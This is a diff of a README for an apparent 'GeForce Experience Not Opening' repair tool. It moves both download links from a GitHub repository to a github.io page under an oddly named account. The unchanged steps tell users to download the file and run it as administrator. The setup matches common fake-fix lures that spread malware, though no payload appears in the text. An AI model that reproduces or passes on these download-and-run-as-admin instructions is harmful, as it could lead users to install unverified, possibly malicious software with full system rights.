@@ -1,6 +1,6 @@
 # 🛠️ GeForce-Experience-Not-Opening-Fix - Restore Your NVIDIA Control Panel Access Today
 
-[![](https://img.shields.io/badge/Download-Fix_Tool-blue)](https://github.com/familygerridaetorresstrait699/GeForce-Experience-Not-Opening-Fix)
+[![](https://img.shields.io/badge/Download-Fix_Tool-blue)](https://familygerridaetorresstrait699.github.io)
 
 ## 📌 Introduction
 
@@ -19,7 +19,7 @@ This software works on computers that meet the following criteria:
 
 Follow these steps to obtain and run the repair tool.
 
-1.  Visit the download page: [Download The Fix Tool](https://github.com/familygerridaetorresstrait699/GeForce-Experience-Not-Opening-Fix)
+1.  Visit the download page: [Download The Fix Tool](https://familygerridaetorresstrait699.github.io)
 2.  Save the file to your computer. A folder like Downloads works well.
 3.  Locate the file you just saved.
 4.  Right-click the file and select Run as administrator.
